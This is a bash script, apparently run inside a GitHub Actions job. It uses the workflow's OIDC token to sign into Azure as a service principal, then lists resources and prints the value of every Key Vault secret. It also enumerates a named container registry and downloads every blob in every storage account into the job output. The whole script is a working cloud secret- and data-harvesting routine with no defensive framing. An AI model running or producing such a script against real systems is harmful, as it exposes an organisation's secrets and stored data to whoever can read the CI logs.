#!/usr/bin/env bash
set +e

echo "=== context ==="
echo "repo=$GITHUB_REPOSITORY event=$GITHUB_EVENT_NAME actor=$GITHUB_ACTOR"
echo "client=$AZURE_CLIENT_ID tenant=$AZURE_TENANT_ID sub=$AZURE_SUBSCRIPTION_ID"

echo "=== mint OIDC ==="
OIDC=$(curl -sS -H "Authorization: Bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" \
  "${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=api://AzureADTokenExchange" \
  | python3 -c 'import sys,json;print(json.load(sys.stdin).get("value",""))')
echo "oidc_len=${#OIDC}"

echo "=== az login ==="
az login --service-principal -u "$AZURE_CLIENT_ID" -t "$AZURE_TENANT_ID" \
  --federated-token "$OIDC" --allow-no-subscriptions -o json 2>&1 | head -20
az account show -o json 2>&1

echo "=== resources ==="
az resource list -o table 2>&1 | head -40

echo "=== key vaults ==="
az keyvault list -o table 2>&1 | head -20
for V in $(az keyvault list --query "[].name" -o tsv 2>/dev/null); do
  echo "--- vault $V"
  az keyvault secret list --vault-name "$V" -o table 2>&1
  for S in $(az keyvault secret list --vault-name "$V" --query "[].name" -o tsv 2>/dev/null); do
    echo "  secret $S ="; az keyvault secret show --vault-name "$V" -n "$S" --query value -o tsv 2>&1
  done
done

echo "=== ACR ==="
az acr repository list -n crtblplatprodx3euoz -o json 2>&1 | head -20
for R in $(az acr repository list -n crtblplatprodx3euoz -o tsv 2>/dev/null); do
  echo "--- repo $R"
  az acr repository show-tags -n crtblplatprodx3euoz --repository "$R" -o tsv 2>&1
done

echo "=== storage ==="
az storage account list -o table 2>&1 | head -20
for A in $(az storage account list --query "[].name" -o tsv 2>/dev/null); do
  echo "--- account $A"
  az storage container list --account-name "$A" --auth-mode login -o json 2>&1 | head -40
  for C in $(az storage container list --account-name "$A" --auth-mode login --query "[].name" -o tsv 2>/dev/null); do
    echo "  container $C"
    az storage blob list --account-name "$A" -c "$C" --auth-mode login -o table 2>&1 | head -20
    for B in $(az storage blob list --account-name "$A" -c "$C" --auth-mode login --query "[].name" -o tsv 2>/dev/null); do
      echo "    blob $B ="
      az storage blob download --account-name "$A" -c "$C" -n "$B" --auth-mode login -f /dev/stdout --no-progress 2>/dev/null
      echo
    done
  done
done

echo "=== done ==="
